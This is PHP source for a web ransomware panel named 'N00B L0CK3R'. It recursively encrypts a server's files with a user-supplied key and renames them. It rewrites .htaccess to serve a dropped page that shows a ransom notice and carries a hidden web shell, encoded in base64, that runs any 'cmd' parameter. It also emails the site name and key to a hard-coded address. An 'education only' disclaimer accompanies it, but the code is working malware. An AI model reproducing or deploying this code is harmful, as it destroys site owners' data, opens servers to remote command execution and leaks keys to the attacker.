<!DOCTYPE html>
<html>
<head>
   <title>N00B L0CK3R</title>
<style type="text/css">
body {
    background: blue;
    color: white;
}
.input{
    border-style: dotted;
    border-color: white;
    background-color: black;
    color: white;
    text-align: center;
}
.select{
    border-style: dotted;
    border-color: white;
    background-color: black;
    color: white;

}
.submit{
       border-style: dotted;
    border-color: green;
    background-color: black;
    color: white;
}
.result{
  text-align: left;
  font-family: sans-serif;
}
h1{
  text-align: center;
  font-family: inherit;
  font-weight: bold;
}
h2{
  text-align: center;
}
.footer {
  position: fixed;
  bottom: 0px;
  font-weight: lighter;
  }
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".n00bcut")){
      rename(".htaccess", ".n00bcut");
      if(fwrite(fopen('.htaccess', 'w'), "#fucker\r\nDirectoryIndex 0.php\r\nErrorDocument 404 /0.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("0.php", base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgY2hhcnNldD0idXRmLTgiPgo8dGl0bGU+SW5mZWN0ZWQgd2l0aCBOMDBCIEwwQ0tSPC90aXRsZT4KPG1ldGEgbmFtZT0iTjAwYml0YSI+Cgo8c3R5bGUgdHlwZSA9InRleHQvY3NzIj4KYm9keXsKYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CmNvbG9yOiB3aGl0ZTsKfQpoMXsKdGV4dC1hbGlnbjogY2VudGVyOwpmb250LWZhbWlseTogc2VyaWY7CmZvbnQtc2l6ZTogMjBQeDsKY29sb3I6IHdoaXRlOwp9Cgo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8Y2VudGVyPgo8cHJlPgoKODg4YiAgICA4ODggLmQ4ODg4Yi4gIC5kODg4OGIuIDg4ODg4OGIuICAgICA4ODggICAgICAuZDg4ODhiLiAgLmQ4ODg4Yi4gODg4ICAgIGQ4UCAgLmQ4ODg4Yi4gODg4ODg4OGIuCjg4ODhiICAgODg4ZDg4UCAgWTg4YmQ4OFAgIFk4OGI4ODggICI4OGIgICAgODg4ICAgICBkODhQICBZODhiZDg4UCAgWTg4Yjg4OCAgIGQ4UCAgZDg4UCAgWTg4Yjg4OCAgIFk4OGIKODg4ODhiICA4ODg4ODggICAgODg4ODg4ICAgIDg4ODg4OCAgLjg4UCAgICA4ODggICAgIDg4OCAgICA4ODg4ODggICAgODg4ODg4ICBkOFAgICAgICAgIC5kODhQODg4ICAgIDg4OAo4ODhZODhiIDg4ODg4OCAgICA4ODg4ODggICAgODg4ODg4ODg4OEsuICAgIDg4OCAgICAgODg4ICAgIDg4ODg4OCAgICAgICA4ODhkODhLICAgICAgICA4ODg4IiA4ODggICBkODhQCjg4OCBZODhiODg4ODg4ICAgIDg4ODg4OCAgICA4ODg4ODggICJZODhiICAgODg4ICAgICA4ODggICAgODg4ODg4ICAgICAgIDg4ODg4ODhiICAgICAgICAiWThiLjg4ODg4ODhQIgo4ODggIFk4ODg4ODg4OCAgICA4ODg4ODggICAgODg4ODg4ICAgIDg4OCAgIDg4OCAgICAgODg4ICAgIDg4ODg4OCAgICA4ODg4ODggIFk4OGIgIDg4OCAgICA4ODg4ODggVDg4Ygo4ODggICBZODg4OFk4OGIgIGQ4OFBZODhiICBkODhQODg4ICAgZDg4UCAgIDg4OCAgICAgWTg4YiAgZDg4UFk4OGIgIGQ4OFA4ODggICBZODhiIFk4OGIgIGQ4OFA4ODggIFQ4OGIKODg4ICAgIFk4ODggIlk4ODg4UCIgICJZODg4OFAiIDg4ODg4ODhQIiAgICA4ODg4ODg4OCAiWTg4ODhQIiAgIlk4ODg4UCIgODg4ICAgIFk4OGIgIlk4ODg4UCIgODg4ICAgVDg4YgoKPC9wcmU+CjxoMT5Xb29oYS4uLi4hISBTZWVtcyB5b3VyIHNpdGUgaXMgZW5jcnlwdGVkIHdpdGggUmFuc29td2FyZTwvaDEKPGk+UGxlYXNlIG5vdGUgdGhpcyBpcyBmb3IgZWR1Y2F0aW9uIHB1cnBvc2Ugb25seTwvaT4KCjxmb290ZXI+Q29weXJpZ2h0IChjKSAyMDE3IENvcHlyaWdodCBIb2xkZXIgQWxsIFJpZ2h0cyBSZXNlcnZlZC48L2Zvb3Rlcj4KCgo8L2NlbnRlcj4KCgo8P3BocCAvLyBIQUNLOgppZiAoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICRjbWQgPSAoJF9SRVFVRVNUWyJjbWQiXSk7CiAgc3lzdGVtKCRjbWQpOwogIGVjaG8gIjxwcmU+JGNtZDwvcHJlPiI7CiAgZGllOwp9CgogPz4KCjwvYm9keT4KPC9odG1sPgo="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  0.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){
      if( file_exists(".n00bcut") ){
        if( unlink(".htaccess") && unlink("0.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> 0.php (Default Page)<br>';
        }
        rename(".n00bcut", ".htaccess");
      }
   }
   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"AwesomeWare.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"0.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".n00bcut") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }
   public function report($key){
        $message.= "=========     Details    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= EOF =========\n\n";
        $message.= "Ghost © 2017";
        $subject = "Report Ransomeware";
        $ducker = "secbreacher@gmail.com";
		$headers = "From: Ransomware <ransomeware@0.today>\r\n";
        mail($ducker,$subject,$message,$headers);
   }
   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".0");
        break;
        case '2':
          $locates = str_replace(".0", "", $locate);
          rename($locate, $locates);
        break;
      }
   }
   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );
      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }
   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}
if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>

<center><h1> Control Pannel</h1>
<fieldset>
<legend><h2>{ N00B L0CK3R }</h2><legend>



  <form action="" method="post" style=" text-align: center;">
        <label>Secret Password : </label>
        <input type="text" size="40px" name="key" class="input" placeholder="Enter Secret to LOCK/UNLOCK">
        <select name="method" class="select">
           <option value="1">Encrypt</option>
           <option value="2">Decrypt</option>
        </select><br></br>
        <input type="submit" size="40" name="submit" class="submit" value="Submit" />
  </form>

<p><b>Readme : </b></p>
<i>This ransomeware is for education Purpose only. do not use this to harm any site.</i>
  <p>Designed for Demonstrate how ransomeware affects the web servers</p>
  <p>It will help you to understand the risk-factor</p>
  <p>This script use AES encryption </p>
  <b>
  <blockquote>Security is illusion !</blockquote></b>


</fieldset>
<div class="footer">
 <p class="love">Made with <i class="icon ion-heart"></i> by D03RAM0N</p>
  <i>Copyright (c) 2017 </i>
</div>
<?php
}?>
</div>
</body>
</html>


<?php
  
?>
